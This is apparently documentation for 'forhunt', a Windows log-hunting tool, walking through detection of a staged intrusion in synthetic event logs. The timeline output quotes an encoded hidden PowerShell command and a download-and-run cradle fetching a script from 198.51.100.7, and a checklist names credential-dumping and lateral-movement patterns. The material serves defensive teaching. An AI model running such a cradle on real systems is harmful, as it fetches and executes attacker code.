# Quick example: the built-in WS-07 scenario (offline)

`fixtures/synthetic` holds generated logs (no real data) with a fixed attack
on `WS-07.contoso.local` on 2024-03-11, hidden among ~3,500 background
events. Everything below runs offline from a clone of the repository.

```bash
E="fixtures/synthetic/Security.evtx fixtures/synthetic/System.evtx fixtures/synthetic/Sysmon.evtx fixtures/synthetic/PowerShell.evtx"
forhunt stats $E -q | head -3
```
```json
{"stats":{"files":4,"events":3519,"first":"2024-03-11T08:00:01.095000Z","last":"2024-03-11T11:59:59.674000Z","hosts":1,"bad_chunks":0,"bad_records":0}}
```

Checklist sweep (abridged):
```bash
forhunt checklist $E -k skill/references/checklists/checklists.json | grep 'HIT?'
```
```text
| FH-INIT-001 | Password spraying - many distinct accounts failing from one source address | … | HIT? | 35 match(es), e.g. 4a2aa2ed:53276 … |
| FH-INIT-007 | Successful interactive or network logon from a public IP … | … | HIT? | 1 match(es), e.g. 4a2aa2ed:53413 … |
| FH-EXE-003 | PowerShell started with an encoded command (Sysmon 1) | … | HIT? | 1 match(es), e.g. 8d8030c1:120332 … |
| FH-EXE-007 | PowerShell script block containing a download cradle (4104) | … | HIT? | 1 match(es), e.g. 3586c6c0:3033 … |
| FH-CRED-001 | LSASS memory access with dump-capable access mask … | … | HIT? | 1 match(es), e.g. 8d8030c1:120343 … |
| FH-LAT-001 | PsExec service installed on target (PSEXESVC) | … | HIT? | 1 match(es), e.g. 59776ed6:8297 … |
| FH-PER-004 | Scheduled task created - Security 4698 | … | HIT? | 1 match(es), e.g. 4a2aa2ed:53581 … |
| FH-PRV-004 | Member added to local Administrators (4732) | … | HIT? | 1 match(es), e.g. 4a2aa2ed:53601 … |
| FH-DEF-001 | Security log cleared (1102) | … | HIT? | 1 match(es), e.g. 4a2aa2ed:53628 |
…
```
Broad baseline checks (e.g. FH-PRV-001 4672 for any account, FH-AD-010
silver tickets) also report `HIT?` with hundreds of matches: they are
correlation checks that the analyst resolves with targeted queries, usually to
NO_HIT for background noise.

The attack window, merged across the four logs:
```bash
forhunt timeline $E --computer WS-07 --since 2024-03-11T10:10:00Z --until 2024-03-11T10:31:00Z -e 4624,4672,4688,1,3,10,11,4104,7045,4698,4720,4732,1102
```
Attack rows (interleaved background events omitted here):
```json
{"id":"4a2aa2ed:53413","t":"2024-03-11T10:10:02.000000Z","h":"WS-07.contoso.local","ch":"Sec","eid":4624,"ti":"Logon success","d":{"user":"administrator","dom":"CONTOSO","lt":10,"ip":"203.0.113.50","port":"49732","auth":"NTLM",…}}
{"id":"4a2aa2ed:53481","t":"2024-03-11T10:15:00.000000Z","h":"WS-07.contoso.local","ch":"Sec","eid":4688,"ti":"Process created","d":{"s_user":"administrator",…,"img":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","cmd":"powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcALwBhAC4AcABzADEAJwApAA==",…}}
{"id":"3586c6c0:3033","t":"2024-03-11T10:15:01.000000Z","h":"WS-07.contoso.local","ch":"PS","eid":4104,"ti":"PowerShell script block","d":{"script":"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')",…}}
{"id":"8d8030c1:120343","t":"2024-03-11T10:18:00.000000Z","h":"WS-07.contoso.local","ch":"Sysmon","eid":10,"ti":"Process accessed","d":{"src_img":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","dst_img":"C:\\Windows\\system32\\lsass.exe","access":"0x1fffff",…}}
{"id":"59776ed6:8297","t":"2024-03-11T10:22:00.000000Z","h":"WS-07.contoso.local","ch":"Sys","eid":7045,"ti":"Service installed","d":{"svc":"PSEXESVC","svc_path":"%SystemRoot%\\PSEXESVC.exe",…}}
…
{"summary":{"cmd":"timeline","matches":…}}
```

The resulting attack path is the example in `references/attack-path.md`.
